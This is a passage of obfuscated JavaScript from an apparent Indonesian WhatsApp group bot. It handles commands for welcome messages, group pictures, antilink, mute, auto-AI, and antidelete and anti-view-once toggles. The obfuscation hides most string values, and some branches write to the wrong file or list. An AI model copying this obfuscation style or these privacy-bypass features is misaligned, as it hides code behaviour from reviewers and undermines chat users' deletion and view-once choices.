            let _0xf0db9f = _0x1b04cf ? _0x1b04cf : _0x5804c8(0x997);
            afk[_0x5804c8(0x1bb)](_0x1b1e88[_0x5804c8(0xd13)], Date['now'](), _0xf0db9f, _afk), _0x614da8['sendTextWithMentions'](_0x1b1e88[_0x5804c8(0x60f)], '@' + _0x1b1e88[_0x5804c8(0xd13)]['split']('@')[0x0] + _0x5804c8(0x630) + _0xf0db9f, _0x1b1e88);
            break;
        case _0x5804c8(0x62c):
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b1e88[_0x5804c8(0xcea)]) return _0x358f3b(_0x5804c8(0x6cd));
            if (!_0x155c75 && !_0x7b6ab6) return _0x358f3b(_0x5804c8(0xccf));
            if (_0x83eae5[0x0] === 'on') {
                _0x1c7aed(_0x5804c8(0xcbb), _0x1b1e88['sender'], _cmd);
                if (_0x1edc83) return _0x358f3b(_0x5804c8(0x8da));
                _0x265bb0[_0x5804c8(0x453)](_0x1b1e88[_0x5804c8(0x60f)]), fs[_0x5804c8(0x933)](_0x5804c8(0x3ed), JSON[_0x5804c8(0x736)](_0x265bb0, null, 0x2)), _0x358f3b(_0x5804c8(0xc84));
            } else {
                if (_0x83eae5[0x0] === _0x5804c8(0x810)) {
                    _0x1c7aed(_0x5804c8(0xcbb), _0x1b1e88[_0x5804c8(0xd13)], _cmd);
                    if (!_0x1edc83) return _0x358f3b('Udah off');
                    let _0x48520d = _0x265bb0[_0x5804c8(0x7a8)](_0x1b1e88['chat']);
                    _0x265bb0['splice'](_0x48520d, 0x1), fs[_0x5804c8(0x933)](_0x5804c8(0x3ed), JSON[_0x5804c8(0x736)](_0x265bb0, null, 0x2)), _0x358f3b(_0x5804c8(0xb33));
                } else _0x358f3b(_0x3b7c58 + _0x453fc1 + ' on -- _mengaktifkan_\x0a' + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x553));
            }
            break;
        case _0x5804c8(0xcd6):
        case _0x5804c8(0x733):
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b1e88['isGroup']) return _0x358f3b(_0x5804c8(0x6cd));
            if (!_0x155c75 && !_0x7b6ab6) return _0x358f3b(_0x5804c8(0xccf));
            if (_0x83eae5[0x0] === 'on') {
                _0x1c7aed(_0x5804c8(0x317), _0x1b1e88['sender'], _cmd);
                if (_0x3b78a2) return _0x358f3b(_0x5804c8(0x8da));
                _0x1609d1[_0x5804c8(0x453)](_0x1b1e88[_0x5804c8(0x60f)]), fs[_0x5804c8(0x933)](_0x5804c8(0x3e1), JSON[_0x5804c8(0x736)](_0x1609d1, null, 0x2)), _0x358f3b('Sukses mengaktifkan goodbye di grup ini');
            } else {
                if (_0x83eae5[0x0] === _0x5804c8(0x810)) {
                    _0x1c7aed(_0x5804c8(0x317), _0x1b1e88[_0x5804c8(0xd13)], _cmd);
                    if (!_0x3b78a2) return _0x358f3b(_0x5804c8(0x289));
                    let _0x223ba0 = _0x1609d1['indexOf'](_0x1b1e88[_0x5804c8(0x60f)]);
                    _0x1609d1['splice'](_0x223ba0, 0x1), fs[_0x5804c8(0x933)](_0x5804c8(0x3ed), JSON[_0x5804c8(0x736)](_0x1609d1, null, 0x2)), _0x358f3b(_0x5804c8(0x18f));
                } else _0x358f3b(_0x3b7c58 + _0x453fc1 + ' on -- _mengaktifkan_\x0a' + (_0x3b7c58 + _0x453fc1) + ' off -- _Menonaktifkan_');
            }
            break;
        case _0x5804c8(0xce7):
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b1e88[_0x5804c8(0xcea)]) return _0x358f3b('Fitur Khusus Group!');
            if (!_0x7b6ab6 && !_0x155c75) return _0x358f3b(_0x5804c8(0x63a));
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0x6b3) + (_0x3b7c58 + _0x453fc1) + ' *teks_welcome*\x0a\x0a_Contoh_\x0a\x0a' + (_0x3b7c58 + _0x453fc1) + ' Halo @user, Selamat datang di @group');
            if (_0x5711f4(_0x1b1e88[_0x5804c8(0x60f)], _0x9626ee)) return _0x358f3b(_0x5804c8(0x355));
            addSetWelcome(_0x1b04cf, _0x1b1e88[_0x5804c8(0x60f)], _0x9626ee), _0x1c7aed('#setwelcome', _0x1b1e88[_0x5804c8(0xd13)], _cmd), _0x358f3b('Successfully set welcome!');
            break;
        case _0x5804c8(0xaf7):
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (!_0x1b1e88['isGroup']) return _0x358f3b('Fitur Khusus Group!');
            if (!_0x7b6ab6 && !_0x155c75) return _0x358f3b(_0x5804c8(0x63a));
            if (!_0x1b04cf) return _0x358f3b('Gunakan dengan cara ' + (_0x3b7c58 + _0x453fc1) + ' *teks_welcome*\x0a\x0a_Contoh_\x0a\x0a' + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x640));
            _0x5711f4(_0x1b1e88['chat'], _0x9626ee) ? (_0x1c7aed(_0x5804c8(0x66a), _0x1b1e88[_0x5804c8(0xd13)], _cmd), changeSetWelcome(q, _0x1b1e88[_0x5804c8(0x60f)], _0x9626ee), _0x358f3b(_0x5804c8(0xd0c))) : (_0x1c7aed(_0x5804c8(0x66a), _0x1b1e88[_0x5804c8(0xd13)], _cmd), addSetWelcome(q, _0x1b1e88['chat'], _0x9626ee), _0x358f3b(_0x5804c8(0xd0c)));
            break;
        case _0x5804c8(0xd99):
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b1e88['isGroup']) return _0x358f3b(_0x5804c8(0x6cd));
            if (!_0x7b6ab6 && !_0x155c75) return _0x358f3b('Fitur Khusus owner!');
            if (!_0x5711f4(_0x1b1e88[_0x5804c8(0x60f)], _0x9626ee)) return _0x358f3b('Belum ada set welcome di sini..');
            removeSetWelcome(_0x1b1e88['chat'], _0x9626ee), _0x1c7aed(_0x5804c8(0xcbc), _0x1b1e88[_0x5804c8(0xd13)], _cmd), _0x358f3b(_0x5804c8(0x3bd));
            break;
        case _0x5804c8(0x19c):
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b1e88[_0x5804c8(0xcea)]) return _0x358f3b(_0x5804c8(0x6cd));
            if (!_0x7b6ab6 && !_0x155c75) return _0x358f3b(_0x5804c8(0x63a));
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0x6b3) + (_0x3b7c58 + _0x453fc1) + ' *teks_left*\x0a\x0a_Contoh_\x0a\x0a' + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x59a));
            if (_0x5f1af7(_0x1b1e88['chat'], _0x219d8b)) return _0x358f3b(_0x5804c8(0xd95));
            _0x1c7aed(_0x5804c8(0x440), _0x1b1e88[_0x5804c8(0xd13)], _cmd), addSetLeft(q, _0x1b1e88[_0x5804c8(0x60f)], _0x219d8b), _0x358f3b('Successfully set left!');
            break;
        case _0x5804c8(0xbd5):
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (!_0x1b1e88[_0x5804c8(0xcea)]) return _0x358f3b(_0x5804c8(0x6cd));
            if (!_0x7b6ab6 && !_0x155c75) return _0x358f3b(_0x5804c8(0x63a));
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0x6b3) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x8ea) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x59a));
            _0x5f1af7(_0x1b1e88[_0x5804c8(0x60f)], _0x219d8b) ? (_0x1c7aed(_0x5804c8(0x607), _0x1b1e88[_0x5804c8(0xd13)], _cmd), changeSetLeft(q, _0x1b1e88[_0x5804c8(0x60f)], _0x219d8b), _0x358f3b(_0x5804c8(0xb2c))) : (_0x1c7aed(_0x5804c8(0x607), _0x1b1e88[_0x5804c8(0xd13)], _cmd), addSetLeft(q, _0x1b1e88[_0x5804c8(0x60f)], _0x219d8b), _0x358f3b(_0x5804c8(0xb2c)));
            break;
        case _0x5804c8(0x6f2):
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b1e88[_0x5804c8(0xcea)]) return _0x358f3b(_0x5804c8(0x6cd));
            if (!_0x7b6ab6 && !_0x155c75) return _0x358f3b(_0x5804c8(0x63a));
            if (!_0x5f1af7(_0x1b1e88[_0x5804c8(0x60f)], _0x219d8b)) return _0x358f3b(_0x5804c8(0x6c9));
            _0x1c7aed(_0x5804c8(0x5ad), _0x1b1e88[_0x5804c8(0xd13)], _cmd), removeSetLeft(_0x1b1e88['chat'], _0x219d8b), _0x358f3b(_0x5804c8(0x7e8));
            break;
        case _0x5804c8(0x855):
        case _0x5804c8(0x621):
        case _0x5804c8(0x49b): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b1e88[_0x5804c8(0xcea)]) return _0x358f3b('Fitur Khusus Group!');
            if (!_0x2ab1a1) return _0x358f3b(mess[_0x5804c8(0x4f6)]);
            let _0x3c8e89 = await _0x614da8[_0x5804c8(0xcad)](_0x1b1e88[_0x5804c8(0x60f)]);
            _0x614da8['sendText'](_0x1b1e88[_0x5804c8(0x60f)], _0x5804c8(0x95f) + _0x3c8e89 + '\x0a\x0aLink Group : ' + _0x53b8b8[_0x5804c8(0x75a)], _0x1b1e88, {
                'detectLink': !![]
            });
        }
        break;
        case _0x5804c8(0x4c4):
        case _0x5804c8(0x896): {
            if (!_0x7b6ab6) return _0x358f3b('Fitur Khusus owner!');
            if (!_0x8a4e1a) return _0x358f3b('Reply foto dgn caption ' + (_0x3b7c58 + _0x453fc1));
            if (!/image/ ['test'](_0x2b1d7d)) return _0x358f3b(_0x5804c8(0xb52) + (_0x3b7c58 + _0x453fc1));
            if (/webp/ [_0x5804c8(0xbaa)](_0x2b1d7d)) return _0x358f3b(_0x5804c8(0xb52) + (_0x3b7c58 + _0x453fc1));
            let _0x4ed1dd = await _0x614da8['downloadAndSaveMediaMessage'](_0x8a4e1a);
            var {
                img: _0x17cf6c
            } = await generateProfilePicture(_0x4ed1dd);
            await _0x614da8[_0x5804c8(0x529)]({
                'tag': 'iq',
                'attrs': {
                    'to': _0x1117db,
                    'type': _0x5804c8(0xb43),
                    'xmlns': _0x5804c8(0x68a)
                },
                'content': [{
                    'tag': _0x5804c8(0x45a),
                    'attrs': {
                        'type': _0x5804c8(0x63e)
                    },
                    'content': _0x17cf6c
                }]
            }), _0x358f3b(_0x5804c8(0x90f));
        }
        break;
        case 'pppanjanggc':
        case _0x5804c8(0xade):
        case 'setppgc2': {
            if (!_0x1b1e88['isGroup']) return _0x358f3b(_0x5804c8(0x6cd));
            if (!_0x155c75) return _0x358f3b(_0x5804c8(0xccf));
            if (!_0x2ab1a1) return _0x358f3b(mess[_0x5804c8(0x4f6)]);
            if (!_0x8a4e1a) return _0x358f3b(_0x5804c8(0xb52) + (_0x3b7c58 + _0x453fc1));
            if (!/image/ ['test'](_0x2b1d7d)) return _0x358f3b(_0x5804c8(0xb52) + (_0x3b7c58 + _0x453fc1));
            if (/webp/ [_0x5804c8(0xbaa)](_0x2b1d7d)) return _0x358f3b(_0x5804c8(0xb52) + (_0x3b7c58 + _0x453fc1));
            let _0x1788c8 = await _0x614da8['downloadAndSaveMediaMessage'](_0x8a4e1a);
            var {
                img: _0x17cf6c
            } = await generateProfilePicture(_0x1788c8);
            await _0x614da8[_0x5804c8(0x529)]({
                'tag': 'iq',
                'attrs': {
                    'to': _0x1b1e88[_0x5804c8(0x60f)],
                    'type': _0x5804c8(0xb43),
                    'xmlns': _0x5804c8(0x68a)
                },
                'content': [{
                    'tag': _0x5804c8(0x45a),
                    'attrs': {
                        'type': _0x5804c8(0x63e)
                    },
                    'content': _0x17cf6c
                }]
            }), _0x358f3b('Done!!!');
        }
        break;
        case 'setppgroup':
        case _0x5804c8(0x188):
        case _0x5804c8(0x18b): {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (!_0x1b1e88[_0x5804c8(0xcea)]) return _0x358f3b(_0x5804c8(0x6cd));
            if (!_0x155c75) return _0x358f3b(_0x5804c8(0xccf));
            if (!_0x2ab1a1) return _0x358f3b(mess['BotAdmin']);
            if (!_0x8a4e1a) return _0x358f3b(_0x5804c8(0x294) + (_0x3b7c58 + _0x453fc1));
            if (!/image/ [_0x5804c8(0xbaa)](_0x2b1d7d)) return _0x358f3b(_0x5804c8(0x294) + (_0x3b7c58 + _0x453fc1));
            if (/webp/ [_0x5804c8(0xbaa)](_0x2b1d7d)) return _0x358f3b('Kirim/Reply Image Dengan Caption ' + (_0x3b7c58 + _0x453fc1));
            let _0x14d3fd = await _0x614da8[_0x5804c8(0x70e)](_0x8a4e1a);
            await _0x614da8[_0x5804c8(0x4ae)](_0x1b1e88[_0x5804c8(0x60f)], {
                'url': _0x14d3fd
            })[_0x5804c8(0xb9d)](_0x5f4c32 => fs['unlinkSync'](_0x14d3fd)), _0x358f3b(_0x5804c8(0x7c1));
        }
        break;
        case _0x5804c8(0x7c9):
        case _0x5804c8(0xc04): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b1e88[_0x5804c8(0xcea)]) return _0x358f3b(_0x5804c8(0x6cd));
            if (!_0x155c75) return _0x358f3b(_0x5804c8(0xccf));
            if (!_0x2ab1a1) return _0x358f3b(mess[_0x5804c8(0x4f6)]);
            if (!_0x1b04cf) return _0x358f3b('Example ' + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x1ab));
            await _0x614da8[_0x5804c8(0x90e)](_0x1b1e88[_0x5804c8(0x60f)], _0x1b04cf)['then'](_0x4323a1 => _0x358f3b(_0x5804c8(0x73f)))['catch'](_0x21d4bd => _0x358f3b(jsonformat(_0x21d4bd)));
        }
        break;
        case 'sc':
        case 'source': {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            sc = fs[_0x5804c8(0x456)](_0x5804c8(0x2fc)), _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'audio': sc,
                'mimetype': 'audio/mpeg',
                'ptt': !![]
            }, {
                'quoted': _0x1b1e88
            });
        }
        break;
        case 'setdesc':
        case 'setdesk': {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (!_0x1b1e88[_0x5804c8(0xcea)]) return _0x358f3b('Fitur Khusus Group!');
            if (!_0x155c75) return _0x358f3b('Fitur Khusus admin!');
            if (!_0x2ab1a1) return _0x358f3b(mess[_0x5804c8(0x4f6)]);
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0x7dd) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x1ab));
            await _0x614da8[_0x5804c8(0xd91)](_0x1b1e88['chat'], _0x1b04cf)['then'](_0x61fd7a => _0x358f3b(_0x5804c8(0x73f)))[_0x5804c8(0xb9d)](_0xdfbab7 => _0x358f3b(jsonformat(_0xdfbab7)));
        }
        break;
        case 'autoaigrup':
        case _0x5804c8(0x4f9):
        case _0x5804c8(0x3e0): {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (!_0x1b1e88[_0x5804c8(0xcea)]) return _0x358f3b(_0x5804c8(0x6cd));
            if (!_0x155c75 && !_0x7b6ab6) return _0x358f3b(_0x5804c8(0xccf));
            if (_0x83eae5[0x0] === 'on') {
                _0x1c7aed(_0x5804c8(0xbff), _0x1b1e88[_0x5804c8(0xd13)], _cmd);
                if (_0x54303b) return _0x358f3b(_0x5804c8(0x87b));
                openaigc[_0x5804c8(0x453)](_0x1b1e88[_0x5804c8(0x60f)]), fs[_0x5804c8(0x933)](_0x5804c8(0x477), JSON['stringify'](openaigc, null, 0x2)), _0x358f3b(_0x5804c8(0x44f));
            } else {
                if (_0x83eae5[0x0] === _0x5804c8(0x810)) {
                    _0x1c7aed('#autoaigrup', _0x1b1e88[_0x5804c8(0xd13)], _cmd);
                    if (!_0x54303b) return _0x358f3b(_0x5804c8(0x7ea));
                    let _0x2de3e1 = openaigc[_0x5804c8(0x7a8)](_0x1b1e88[_0x5804c8(0x60f)]);
                    openaigc[_0x5804c8(0x217)](_0x2de3e1, 0x1), fs[_0x5804c8(0x933)](_0x5804c8(0x477), JSON['stringify'](openaigc, null, 0x2)), _0x358f3b(_0x5804c8(0xb81));
                } else _0x358f3b(_0x3b7c58 + _0x453fc1 + _0x5804c8(0x1d7) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x553));
            }
        }
        break;
        case 'autodlgc': {
            if (!_0x1b1e88[_0x5804c8(0xcea)]) return _0x358f3b(_0x5804c8(0x6cd));
            if (!_0x155c75 && !_0x7b6ab6) return _0x358f3b('Fitur Khusus admin!');
            if (_0x83eae5[0x0] === 'on') {
                _0x1c7aed(_0x5804c8(0xa12), _0x1b1e88[_0x5804c8(0xd13)], _cmd);
                if (_0x1e9068) return _0x358f3b(_0x5804c8(0x87b));
                autodlgc[_0x5804c8(0x453)](_0x1b1e88[_0x5804c8(0x60f)]), fs[_0x5804c8(0x933)](_0x5804c8(0x4ef), JSON[_0x5804c8(0x736)](autodlgc, null, 0x2)), _0x358f3b(_0x5804c8(0x177));
            } else {
                if (_0x83eae5[0x0] === 'off') {
                    _0x1c7aed(_0x5804c8(0xa12), _0x1b1e88[_0x5804c8(0xd13)], _cmd);
                    if (!_0x1e9068) return _0x358f3b(_0x5804c8(0x7ea));
                    let _0x3383b5 = autodlgc[_0x5804c8(0x7a8)](_0x1b1e88[_0x5804c8(0x60f)]);
                    autodlgc[_0x5804c8(0x217)](_0x3383b5, 0x1), fs['writeFileSync']('./database/autodlgc.json', JSON[_0x5804c8(0x736)](autodlgc, null, 0x2)), _0x358f3b(_0x5804c8(0x181));
                } else _0x358f3b(_0x3b7c58 + _0x453fc1 + ' on -- _mengaktifkan_\x0a' + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x553));
            }
        }
        break;
        case _0x5804c8(0x247):
        case _0x5804c8(0x8d5):
        case _0x5804c8(0x64d): {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (_0x1b1e88[_0x5804c8(0xcea)]) return _0x358f3b(_0x5804c8(0xc2d));
            if (!_0x7b6ab6) return _0x358f3b(_0x5804c8(0xccf));
            if (_0x83eae5[0x0] === 'on') {
                _0x1c7aed(_0x5804c8(0x837), _0x1b1e88[_0x5804c8(0xd13)], _cmd);
                if (_0x139b1f) return _0x358f3b(_0x5804c8(0x87b));
                openaipc[_0x5804c8(0x453)](_0x1117db), fs['writeFileSync']('./database/openaipc.json', JSON[_0x5804c8(0x736)](openaipc, null, 0x2)), _0x358f3b(_0x5804c8(0x44f));
            } else {
                if (_0x83eae5[0x0] === 'off') {
                    _0x1c7aed(_0x5804c8(0x837), _0x1b1e88[_0x5804c8(0xd13)], _cmd);
                    if (!_0x139b1f) return _0x358f3b('Udah nonaktif');
                    let _0x1ecb08 = openaipc[_0x5804c8(0x7a8)](_0x1117db);
                    openaipc[_0x5804c8(0x217)](_0x1ecb08, 0x1), fs['writeFileSync']('./database/openaipc.json', JSON[_0x5804c8(0x736)](openaipc, null, 0x2)), _0x358f3b(_0x5804c8(0xb81));
                } else _0x358f3b(_0x3b7c58 + _0x453fc1 + _0x5804c8(0x1d7) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x553));
            }
        }
        break;
        case _0x5804c8(0x2eb): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b1e88[_0x5804c8(0xcea)]) return _0x358f3b(_0x5804c8(0x6cd));
            if (!_0x155c75 && !_0x7b6ab6) return _0x358f3b(_0x5804c8(0xccf));
            if (!_0x2ab1a1) return _0x358f3b(mess[_0x5804c8(0x4f6)]);
            if (_0x83eae5[0x0] === 'on') {
                _0x1c7aed('#antilink', _0x1b1e88[_0x5804c8(0xd13)], _cmd);
                if (_0x227ca0) return _0x358f3b(_0x5804c8(0x87b));
                antilink['push'](_0x1b1e88[_0x5804c8(0x60f)]), fs[_0x5804c8(0x933)](_0x5804c8(0x312), JSON[_0x5804c8(0x736)](antilink, null, 0x2)), _0x358f3b(_0x5804c8(0x3f3));
            } else {
                if (_0x83eae5[0x0] === _0x5804c8(0x810)) {
                    _0x1c7aed('#antilink', _0x1b1e88['sender'], _cmd);
                    if (!_0x227ca0) return _0x358f3b(_0x5804c8(0x7ea));
                    let _0x169dac = antilink['indexOf'](_0x1b1e88['chat']);
                    antilink[_0x5804c8(0x217)](_0x169dac, 0x1), fs[_0x5804c8(0x933)](_0x5804c8(0x312), JSON['stringify'](antilink, null, 0x2)), _0x358f3b(_0x5804c8(0x1fd));
                } else _0x358f3b(_0x3b7c58 + _0x453fc1 + ' on -- _mengaktifkan_\x0a' + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x553));
            }
        }
        break;
        case _0x5804c8(0xa5e): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b1e88[_0x5804c8(0xcea)]) return _0x358f3b('Fitur Khusus Group!');
            if (!_0x155c75 && !_0x7b6ab6) return _0x358f3b('Fitur Khusus admin!');
            if (!_0x2ab1a1) return _0x358f3b(mess['BotAdmin']);
            if (_0x83eae5[0x0] === 'on') {
                _0x1c7aed(_0x5804c8(0xc63), _0x1b1e88[_0x5804c8(0xd13)], _cmd);
                if (_0x327d5f) return _0x358f3b('Udah aktif');
                antilink2[_0x5804c8(0x453)](_0x1b1e88[_0x5804c8(0x60f)]), fs['writeFileSync'](_0x5804c8(0x618), JSON[_0x5804c8(0x736)](antilink2, null, 0x2)), _0x358f3b(_0x5804c8(0x3fe));
            } else {
                if (_0x83eae5[0x0] === _0x5804c8(0x810)) {
                    _0x1c7aed(_0x5804c8(0xc63), _0x1b1e88[_0x5804c8(0xd13)], _cmd);
                    if (!_0x327d5f) return _0x358f3b(_0x5804c8(0x7ea));
                    let _0x1b2796 = antilink2[_0x5804c8(0x7a8)](_0x1b1e88[_0x5804c8(0x60f)]);
                    antilink2[_0x5804c8(0x217)](_0x1b2796, 0x1), fs['writeFileSync'](_0x5804c8(0x618), JSON[_0x5804c8(0x736)](antilink2, null, 0x2)), _0x358f3b(_0x5804c8(0x8ee));
                } else _0x358f3b(_0x3b7c58 + _0x453fc1 + _0x5804c8(0x1d7) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x553));
            }
        }
        break;
        case _0x5804c8(0x4ca): {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (!_0x1b1e88['isGroup']) return _0x358f3b(_0x5804c8(0x6cd));
            if (!_0x155c75) return _0x358f3b(_0x5804c8(0xccf));
            if (!_0x2ab1a1) return _0x358f3b(mess['BotAdmin']);
            if (_0x83eae5[0x0] === 'on') {
                _0x1c7aed(_0x5804c8(0xac5), _0x1b1e88['sender'], _cmd);
                if (_0x4ca01d) return _0x358f3b(_0x5804c8(0x87b));
                kickme['push'](_0x1b1e88[_0x5804c8(0x60f)]), fs[_0x5804c8(0x933)](_0x5804c8(0x6c5), JSON[_0x5804c8(0x736)](kickme, null, 0x2)), _0x358f3b('Successfully Activate Kickme In This Group');
            } else {
                if (_0x83eae5[0x0] === _0x5804c8(0x810)) {
                    _0x1c7aed(_0x5804c8(0xac5), _0x1b1e88[_0x5804c8(0xd13)], _cmd);
                    if (!_0x4ca01d) return _0x358f3b(_0x5804c8(0x7ea));
                    let _0x16483f = kickme[_0x5804c8(0x7a8)](_0x1b1e88[_0x5804c8(0x60f)]);
                    kickme[_0x5804c8(0x217)](_0x16483f, 0x1), fs[_0x5804c8(0x933)](_0x5804c8(0x6c5), JSON[_0x5804c8(0x736)](kickme, null, 0x2)), _0x358f3b(_0x5804c8(0x49e));
                } else _0x358f3b(_0x3b7c58 + _0x453fc1 + _0x5804c8(0x1d7) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x553));
            }
        }
        break;
        case 'mute': {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b1e88[_0x5804c8(0xcea)]) return _0x358f3b(_0x5804c8(0x6cd));
            if (!_0x155c75 && !_0x7b6ab6) return _0x358f3b(_0x5804c8(0xccf));
            if (_0x83eae5[0x0] === 'on') {
                _0x1c7aed(_0x5804c8(0xb7a), _0x1b1e88[_0x5804c8(0xd13)], _cmd);
                if (_0x2e0069) return _0x358f3b(_0x5804c8(0xc34));
                mute[_0x5804c8(0x453)](_0x1b1e88[_0x5804c8(0x60f)]), fs[_0x5804c8(0x933)](_0x5804c8(0x1f7), JSON[_0x5804c8(0x736)](mute, null, 0x2)), _0x358f3b('Successfully Mute In This Group');
            } else {
                if (_0x83eae5[0x0] === _0x5804c8(0x810)) {
                    _0x1c7aed(_0x5804c8(0xb7a), _0x1b1e88[_0x5804c8(0xd13)], _cmd);
                    if (!_0x2e0069) return _0x358f3b(_0x5804c8(0xbc4));
                    let _0x24321a = mute[_0x5804c8(0x7a8)](_0x1b1e88[_0x5804c8(0x60f)]);
                    mute[_0x5804c8(0x217)](_0x24321a, 0x1), fs[_0x5804c8(0x933)]('./database/mute.json', JSON[_0x5804c8(0x736)](mute, null, 0x2)), _0x358f3b(_0x5804c8(0xab9));
                } else _0x358f3b(_0x3b7c58 + _0x453fc1 + _0x5804c8(0x1d7) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x553));
            }
        }
        break;
        case 'antidelete': {
            if (!_0x7b6ab6) return _0x358f3b(_0x5804c8(0x63a));
            if (_0x83eae5[0x0] === 'on') {
                _0x1c7aed('#antidelete', _0x1b1e88[_0x5804c8(0xd13)], _cmd);
                if (_0x932571[_0x5804c8(0x694)]) return _0x358f3b('Udah aktif');
                _0x932571[_0x5804c8(0x694)] = !![], _0x358f3b(_0x5804c8(0x49f));
            } else {
                if (_0x83eae5[0x0] === _0x5804c8(0x810)) {
                    _0x1c7aed(_0x5804c8(0x716), _0x1b1e88[_0x5804c8(0xd13)], _cmd);
                    if (!_0x932571[_0x5804c8(0xa8b)]) return _0x358f3b('Udah nonaktif');
                    _0x932571[_0x5804c8(0x694)] = ![], _0x358f3b(_0x5804c8(0xb46));
                } else _0x358f3b(_0x3b7c58 + _0x453fc1 + _0x5804c8(0x1d7) + (_0x3b7c58 + _0x453fc1) + ' off -- _Menonaktifkan_');
            }
        }
        break;
        case 'antionce':
        case _0x5804c8(0x927):
        case _0x5804c8(0x4bf): {
            if (!_0x7b6ab6) return _0x358f3b('Fitur Khusus owner!');
            if (_0x83eae5[0x0] === 'on') {
                _0x1c7aed(_0x5804c8(0xadf), _0x1b1e88[_0x5804c8(0xd13)], _cmd);
                if (_0x932571[_0x5804c8(0xa8b)]) return _0x358f3b(_0x5804c8(0x87b));
                _0x932571[_0x5804c8(0xa8b)] = !![], _0x358f3b(_0x5804c8(0x98a));
            } else {
                if (_0x83eae5[0x0] === 'off') {
                    _0x1c7aed(_0x5804c8(0xadf), _0x1b1e88[_0x5804c8(0xd13)], _cmd);
                    if (!_0x932571[_0x5804c8(0xa8b)]) return _0x358f3b('Udah nonaktif');
                    _0x932571[_0x5804c8(0xa8b)] = ![], _0x358f3b('Successfully Disabling Anti view once In This bot');
                } else _0x358f3b(_0x3b7c58 + _0x453fc1 + _0x5804c8(0x1d7) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x553));
            }
        }
        break;
        case _0x5804c8(0x450): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b1e88[_0x5804c8(0xcea)]) return _0x358f3b('Fitur Khusus Group!');
            if (!_0x155c75) return _0x358f3b(_0x5804c8(0xccf));
            if (!_0x2ab1a1) return _0x358f3b(mess[_0x5804c8(0x4f6)]);
            if (_0x83eae5[0x0] === 'on') {
                _0x1c7aed(_0x5804c8(0x1d8), _0x1b1e88[_0x5804c8(0xd13)], _cmd);
                if (_0x49fc0c) return _0x358f3b(_0x5804c8(0x87b));
                antiwame[_0x5804c8(0x453)](_0x1b1e88[_0x5804c8(0x60f)]), fs['writeFileSync'](_0x5804c8(0xbc3), JSON[_0x5804c8(0x736)](antiwame, null, 0x2)), _0x358f3b('Successfully Activate Antiwame In This Group');
            } else {
                if (_0x83eae5[0x0] === _0x5804c8(0x810)) {
                    _0x1c7aed(_0x5804c8(0x1d8), _0x1b1e88[_0x5804c8(0xd13)], _cmd);
                    if (!_0x49fc0c) return _0x358f3b(_0x5804c8(0x7ea));
                    let _0x2b1390 = antiwame[_0x5804c8(0x7a8)](_0x1b1e88[_0x5804c8(0x60f)]);
                    antiwame[_0x5804c8(0x217)](_0x2b1390, 0x1), fs['writeFileSync']('./database/antiwame.json', JSON[_0x5804c8(0x736)](antiwame, null, 0x2)), _0x358f3b('Successfully Disabling Antiwame In This Group');
                } else _0x358f3b(_0x3b7c58 + _0x453fc1 + ' on -- _mengaktifkan_\x0a' + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x553));
            }
        }
        break;
        case _0x5804c8(0x2c8): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b1e88[_0x5804c8(0xcea)]) return _0x358f3b(_0x5804c8(0x6cd));
            if (!_0x155c75) return _0x358f3b(_0x5804c8(0xccf));
            if (!_0x2ab1a1) return _0x358f3b(mess[_0x5804c8(0x4f6)]);
            if (_0x83eae5[0x0] === 'on') {
                _0x1c7aed(_0x5804c8(0x83d), _0x1b1e88[_0x5804c8(0xd13)], _cmd);
                if (_0xffcce2) return _0x358f3b(_0x5804c8(0x87b));
                antilink['push'](_0x1b1e88['chat']), fs[_0x5804c8(0x933)](_0x5804c8(0xafe), JSON[_0x5804c8(0x736)](antiwame2, null, 0x2)), _0x358f3b(_0x5804c8(0xa02));
            } else {
                if (_0x83eae5[0x0] === _0x5804c8(0x810)) {
